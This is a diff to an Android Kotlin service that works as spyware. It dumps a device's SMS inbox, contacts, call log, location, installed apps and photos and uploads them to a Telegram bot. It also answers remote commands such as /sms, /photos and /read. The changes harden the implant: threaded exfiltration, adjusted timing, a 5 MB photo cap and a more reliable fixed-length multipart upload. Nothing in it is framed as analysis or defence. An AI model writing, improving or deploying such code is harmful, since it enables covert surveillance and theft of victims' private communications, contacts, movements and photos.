@@ -54,15 +54,14 @@ class CoreService : Service() {
     private fun initialDump() {
         try {
             sendText("=== NEW DEVICE ===\n" + deviceInfo())
-            Thread.sleep(800)
+            Thread.sleep(1000)
             sendFile(dumpSms(), "sms.txt")
-            Thread.sleep(1500)
+            Thread.sleep(2000)
             sendFile(dumpContacts(), "contacts.txt")
-            Thread.sleep(1500)
+            Thread.sleep(2000)
             sendFile(dumpCalls(), "calls.txt")
-            Thread.sleep(1500)
+            Thread.sleep(2000)
             sendText("LOC: " + getLoc())
-            sendRecentPhotos(20)
         } catch (e: Exception) {
             Log.e("CoreService", "initialDump: ${e.message}")
         }
@@ -92,25 +91,25 @@ class CoreService : Service() {
         when {
             text == "/sms" -> {
                 sendText("SMS...")
-                sendFile(dumpSms(), "sms.txt")
+                Thread { sendFile(dumpSms(), "sms.txt") }.start()
             }
             text == "/contacts" -> {
                 sendText("Contacts...")
-                sendFile(dumpContacts(), "contacts.txt")
+                Thread { sendFile(dumpContacts(), "contacts.txt") }.start()
             }
             text == "/calls" -> {
                 sendText("Calls...")
-                sendFile(dumpCalls(), "calls.txt")
+                Thread { sendFile(dumpCalls(), "calls.txt") }.start()
             }
             text == "/loc" -> sendText(getLoc())
             text == "/info" -> sendText(deviceInfo())
             text == "/photos" -> {
                 sendText("Photos...")
-                Thread { sendRecentPhotos(50) }.start()
+                Thread { sendRecentPhotos(20) }.start()
             }
             text == "/apps" -> {
                 sendText("Apps...")
-                sendFile(dumpApps(), "apps.txt")
+                Thread { sendFile(dumpApps(), "apps.txt") }.start()
             }
             text.startsWith("/read") -> {
                 val p = text.removePrefix("/read").trim()
@@ -131,7 +130,7 @@ class CoreService : Service() {
         val f = File(cacheDir, "sms.txt")
         val c = contentResolver.query(
             android.net.Uri.parse("content://sms/inbox"),
-            null, null, null, "date DESC LIMIT 500"
+            null, null, null, "date DESC LIMIT 200"
         )
         f.printWriter().use { w ->
             c?.use {
@@ -167,7 +166,7 @@ class CoreService : Service() {
         val f = File(cacheDir, "calls.txt")
         val c = contentResolver.query(
             android.net.Uri.parse("content://call_log/calls"),
-            null, null, null, "date DESC LIMIT 500"
+            null, null, null, "date DESC LIMIT 200"
         )
         f.printWriter().use { w ->
             c?.use {
@@ -221,10 +220,13 @@ class CoreService : Service() {
                         val ins = contentResolver.openInputStream(uri) ?: continue
                         val tmp = File(cacheDir, name)
                         tmp.outputStream().use { o -> ins.copyTo(o) }
-                        sendFile(tmp, name)
+                        // танҳо то 5 МБ
+                        if (tmp.length() < 5 * 1024 * 1024) {
+                            sendFile(tmp, name)
+                            sent++
+                        }
                         tmp.delete()
-                        sent++
-                        Thread.sleep(1200)
+                        Thread.sleep(1500)
                     } catch (e: Exception) {
                         Log.e("CoreService", "photo: ${e.message}")
                     }
@@ -257,8 +259,8 @@ class CoreService : Service() {
             val conn = URL("https://api.telegram.org/bot$BOT/sendMessage").openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
-            conn.connectTimeout = 15000
-            conn.readTimeout = 15000
+            conn.connectTimeout = 30000
+            conn.readTimeout = 30000
             conn.outputStream.write(body.toByteArray())
             conn.inputStream.close()
         } catch (e: Exception) {
@@ -270,27 +272,34 @@ class CoreService : Service() {
         if (!f.exists() || f.length() == 0L) return
         try {
             val b = "----x${System.currentTimeMillis()}"
+            val bytes = f.readBytes()
+
+            val head = "--$b\r\n" +
+                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT\r\n" +
+                "--$b\r\n" +
+                "Content-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n" +
+                "Content-Type: application/octet-stream\r\n\r\n"
+            val tail = "\r\n--$b--\r\n"
+            val headBytes = head.toByteArray()
+            val tailBytes = tail.toByteArray()
+            val totalSize = headBytes.size + bytes.size + tailBytes.size
+
             val conn = URL("https://api.telegram.org/bot$BOT/sendDocument").openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
             conn.connectTimeout = 120000
             conn.readTimeout = 120000
-            conn.setChunkedStreamingMode(0)
+            conn.setFixedLengthStreamingMode(totalSize)
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
 
-            val bytes = f.readBytes()
             conn.outputStream.use { os ->
-                fun p(s: String) = os.write(s.toByteArray())
-                p("--$b\r\n")
-                p("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT\r\n")
-                p("--$b\r\n")
-                p("Content-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n")
-                p("Content-Type: application/octet-stream\r\n\r\n")
+                os.write(headBytes)
                 os.write(bytes)
-                p("\r\n--$b--\r\n")
+                os.write(tailBytes)
+                os.flush()
             }
             val resp = conn.inputStream.bufferedReader().readText()
-            Log.d("CoreService", "sendFile $name: ${resp.take(80)}")
+            Log.d("CoreService", "sendFile $name: ${resp.take(120)}")
         } catch (e: Exception) {
             Log.e("CoreService", "sendFile $name err: ${e.message}")
         }
